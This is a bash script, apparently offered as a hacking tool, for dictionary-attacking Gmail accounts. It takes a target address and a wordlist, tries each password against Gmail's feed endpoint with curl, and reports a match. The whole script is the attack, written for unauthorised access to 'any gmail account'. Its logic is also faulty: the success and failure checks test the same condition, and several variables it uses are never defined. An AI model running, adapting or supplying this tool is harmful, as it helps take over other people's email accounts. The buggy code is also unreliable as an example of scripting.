#!/bin/bash

VERSION=v1.0
RELEASEDATE="2020-12-15"

BRIGHTRED="\e[1;31m"
BRIGHTMAGENTA="\e[1;35m"
END="\e[0m"


#this is where the magic happens
gmailattack() {
requirements_gmail() {
if [[ -n $(curl -v &> /dev/null) ]]; then echo "Curl is Required For The Tool, Exit..."; exit 1;fi }
gmail_attack() {
if [[ -n $(curl -v &> /dev/null) ]]; then echo "Curl is Required For The Tool, Exit..."; exit 1;fi; read -p $'Enter The Email : ' mail

if [[ ! "$mail" =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$ ]]; then echo -e "\e[1;1mError : \e[0memail address $email is Not valid \e[1;1m ENTER VALID EMAIL\e[0m , exit..."; exit 0;fi
read -p $'Wordlist: ' wordlist
if [[ ! -a $wordlist ]]; then echo " Error : Cant Find The WordList try again ,  ENTER VALID PATH , exit..."; exit 0; fi

   printf "\n"
   printf "Target: $mail\n"
   printf "Wordlist: $(pwd)/$wordlist\n\n"
   read -p $'If everything seems okay just click the Enter I will do rest for you gg: ' ready
if [[ -z $ready ]]; then
   printf "Yo the Attack will start in 2s click (CTRL + C ) to exit in case you change your mind \n"
while read -r line; do
name="$line"
attack="$(curl -s -u $mail:$name https://mail.google.com/mail/feed/atom | grep 'xml')"
if [[ -n "$attack" ]]; then
   printf "\n\nWrong Password for $mail: \e[1;31m$name\e[0m\n"
fi

if [ -n "$attack" ]; then
   printf "%88s\n" | tr ' ' '-'
   echo -e  "Got Your Password : $name"
   printf "%88s\n" | tr ' ' '-'
   exit
fi
done < "$wordlist"
   printf "\n\nSorry, I dont think i can fint the password in this worlist try something else \n\n"
   printf "Try with another wordlist...\n\n"
   exit
else
   printf "exit...\n"
   printf "%88s" | tr ' ' '-'
fi
}
requirements_gmail
gmail_attack
}

if [[ $1 = "-g" || $1 = "-gmail" || $1 = "-g" || $1 = "--gmail" ]]; then
     gmailattack
else

if [[ $* = "-n" ]]; then
 printf "

   $basename$0 $VERSION - This is Basic Bash Script For \e[1;1mGmail Bruteforcing\e[0m 

   \e[1;1m Please Use The Below Ways To Run The Tool \e[0m 
    \e[1;1mQuick Tip : \e[0m Read more about how to use this tool in README file
 
   
     $BRIGHTRED--gmail                        - Dictionary attack for crack password for any gmail account
     $BRUGHTWHITE--version                      - Print version of $basename$0



     $GREEN Thanks For Usign the Tool
     $BRIGHTMAGENTA Coded By D4az


"
else

printf "

   $basename$0 $VERSION - This is Basic Bash Script For \e[1;1mGmail Bruteforcing\e[0m 

   \e[1;1m Please Use The Below Ways To Run The Tool \e[0m 
    \e[1;1mQuick Tip : \e[0m Read more about how to use this tool in README file
 
   
     $BRIGHTRED--gmail                        - Start Brute-forcing gmail
     $BRUGHTWHITE--version                      - Print The Current version $basename$0


     $BRIGHTGRAY Thanks For Usign the Tool
     $BRIGHTMAGENTA Coded By D4az

"
fi
fi
